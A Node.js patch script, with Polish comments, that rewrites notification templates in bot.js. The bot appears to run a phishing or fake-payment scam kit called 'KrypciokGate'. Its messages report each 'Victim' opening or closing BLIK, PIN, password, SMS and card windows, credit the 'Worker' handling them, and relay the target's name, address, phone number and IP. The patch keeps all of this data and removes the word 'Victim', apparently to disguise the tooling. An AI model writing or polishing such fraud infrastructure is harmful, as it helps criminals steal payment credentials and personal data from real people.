const fs = require("fs");
const p = "bot.js";
let c = fs.readFileSync(p, "utf8");

function rep(from, to) {
	const before = c;
	c = c.split(from).join(to);
	console.log(before === c ? "BRAK" : "ok", JSON.stringify(from.slice(0, 55)));
}

// Dane kupującego
rep(
	'`📝 <b>KrypciokGate</b>  -  Dane Kupującego\\n\\n` +\n\t\t\t`💰 <b>Kwota:</b> ${oferta.cena} PLN\\n\\n` +\n\t\t\t`👤 <b>Imie i Nazwisko:</b> ${fullName}\\n` +\n\t\t\t`🏠 <b>Adres:</b> <code>${ulica} ${kod} ${miasto}</code>\\n` +\n\t\t\t`📞 <b>Numer Telefonu:</b> <code>${decodeURIComponent(telefon)}</code>\\n\\n` +\n\t\t\t`🌐 <b>IP:</b> <code>${ip}</code>\\n` +\n\t\t\t`📡 <b>Sieć:</b> ${net.label}${net.geo ? ` (${net.geo})` : ""}\\n` +\n\t\t\t`🛡 <b>Wykryto:</b> ${flags.length ? flags.join(" + ") : "brak"}\\n`',
	'`📝 <b>Dane kupującego</b>\\n\\n` +\n\t\t\t`<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN\\n` +\n\t\t\t`👤 <b>Osoba</b> · ${fullName}\\n` +\n\t\t\t`🏠 <b>Adres</b> · <code>${ulica} ${kod} ${miasto}</code>\\n` +\n\t\t\t`📞 <b>Numer</b> · <code>${decodeURIComponent(telefon)}</code></blockquote>\\n` +\n\t\t\t`🌐 <b>IP</b> · <code>${ip}</code>\\n` +\n\t\t\t`📡 <b>Sieć</b> · ${net.label}${net.geo ? ` · ${net.geo}` : ""}\\n` +\n\t\t\t`🛡 <b>Wykryto</b> · ${flags.length ? flags.join(" + ") : "brak"}`'
);

// BLIK open / close
rep(
	'`⚠️ <b>Victim otworzył okno płatności BLIK</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`🔢 <b>Okno BLIK otwarte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);
rep(
	'`❌ <b>Victim zamknął okno płatności BLIK</b>\\n\\n` +\n\t\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`⚠️ <b>Okno BLIK zamknięte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);
rep(
	'`❌ <b>Victim zamknął okno z PINEM</b>\\n\\n` +\n\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`⚠️ <b>Okno PIN zamknięte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);
rep(
	'`❌ <b>Victim zamknął okno z Hasłem</b>\\n\\n` +\n\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`⚠️ <b>Okno hasła zamknięte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);
rep(
	'`❌ <b>Victim zamknął okno SMS</b>\\n\\n` +\n\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`⚠️ <b>Okno SMS zamknięte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);
rep(
	'`💳 <b>Victim otworzył okno z Kartą</b>\\n\\n` +\n\t\t\t`💸 <b>Cena:</b> ${oferta.cena} PLN\\n` +\n\t\t\t`👷 <b>Worker:</b> @${workerName}`',
	'`💳 <b>Okno karty otwarte</b>\\n\\n<blockquote>💵 <b>Kwota</b> · ${oferta.cena} PLN</blockquote>\\n👷 ${workerName}`'
);

fs.writeFileSync(p, c);
